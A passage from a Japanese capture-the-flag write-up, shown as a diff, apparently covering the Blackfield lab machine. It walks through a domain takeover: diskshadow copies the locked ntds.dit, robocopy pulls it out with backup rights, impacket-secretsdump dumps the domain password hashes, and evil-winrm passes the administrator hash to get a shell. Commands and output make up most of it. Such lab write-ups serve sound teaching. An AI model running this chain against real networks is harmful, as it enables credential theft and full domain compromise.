@@ -247,5 +247,81 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 あとはPass-the-HashでAdminのシェルをとる：
 
 ```
+┌──(shoebill㉿shoebill)-[~]
+└─$ impacket-psexec -dc-ip 10.10.10.192 'blackfield.local/Administrator@10.10.10.192' -hashes aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051
+```
+しかし何度やってもAdminのシェルがとれない。
+
+# ntds.ditが必要
+
+secretsdump.pyでハッシュダンプする際に、**ntds.dit**が必要。
+
+ntds.ditはAdmin権限でしかみれないが、`robocopy`コマンドで”バックアップとして”コピーすることは可能（svc_backupの権限より）。
+
+しかしプロセスがアクティブなためコピーできないと言われる。そこで、新しくEドライブを作成し、そのドライブにCドライブごとコピーする。そしてEドライブからrobocopyする。
+
+
+まず次のscript.txtをsvc_backupのシェルに送る：
+```
+set verbose onX
+set metadata C:\Windows\Temp\meta.cabX
+set context clientaccessibleX
+set context persistentX
+begin backupX
+add volume C: alias cdriveX
+createX
+expose %cdrive% E:X
+end backupX
 ```
 
+次のように`diskshadow`コマンドを実行する：
+
+```
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s back_script.txt
+```
+
+Eドライブ中のntds.ditをコピーrobocopyしてやる：
+
+```
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd C:\ 
+*Evil-WinRM* PS C:\> mkdir tmp
+*Evil-WinRM* PS C:\> cd tmp
+*Evil-WinRM* PS C:\temp> robocopy /b E:\Windows\ntds . ntds.dit
+*Evil-WinRM* PS C:\temp> ls
+
+
+    Directory: C:\temp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/29/2022   5:22 AM       18874368 ntds.dit
+```
+
+このntds.ditをKaliに送って、`secretsdump.py`を次のように実行する：
+
+```
+┌──(shoebill㉿shoebill)-[~]
+└─$ impacket-secretsdump -system system -ntds ntds.dit LOCAL
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:93e4f3417e7db10b00895f5220f036c3:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
+support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
+...
+```
+
+このハッシュでPass-the-HashをしてAdminのシェルをとる
+
+```
+┌──(shoebill㉿shoebill)-[~]
+└─$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+blackfield\administrator
+```
